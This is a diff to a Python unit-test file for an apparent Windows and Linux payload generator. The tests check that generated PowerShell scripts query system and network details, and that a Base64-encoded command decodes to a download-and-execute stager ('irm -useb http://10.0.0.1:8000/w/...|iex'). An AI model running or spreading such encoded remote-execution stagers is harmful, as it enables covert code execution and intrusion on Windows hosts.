@@ -23,6 +23,7 @@ class TestEndpoints(unittest.TestCase):
         raw_net = WindowsPayloadGenerator.get_powershell_script("RED / CONEXION")
         self.assertIn("Win32_NetworkAdapterConfiguration", raw_net)
         self.assertIn("Invoke-RestMethod", raw_net)
+        self.assertIn("-UseBasicParsing", raw_net)
 
         raw_hw = WindowsPayloadGenerator.get_powershell_script("HARDWARE / CPU")
         self.assertIn("Win32_Processor", raw_hw)
@@ -42,7 +43,7 @@ class TestEndpoints(unittest.TestCase):
         # Decode Base64 and verify it contains micro-stager downloading from /w/RED
         b64_part = payload_net.split("-EncodedCommand")[-1].strip()
         decoded_stager = base64.b64decode(b64_part).decode("utf-16le")
-        self.assertEqual(decoded_stager, "irm http://10.0.0.1:8000/w/RED|iex")
+        self.assertEqual(decoded_stager, "irm -useb http://10.0.0.1:8000/w/RED|iex")
 
     def test_linux_payload_generation(self):
         """Verify Linux Bash scripts and lightweight micro-stager."""
@@ -94,7 +95,7 @@ class TestEndpoints(unittest.TestCase):
 
             b64_part = payload.split("-EncodedCommand")[-1].strip()
             decoded = base64.b64decode(b64_part).decode("utf-16le")
-            self.assertIn("irm http://10.0.0.1:8000/w/", decoded)
+            self.assertIn("irm -useb http://10.0.0.1:8000/w/", decoded)
             self.assertIn("|iex", decoded)
 
     def test_linux_all_categories_generation(self):
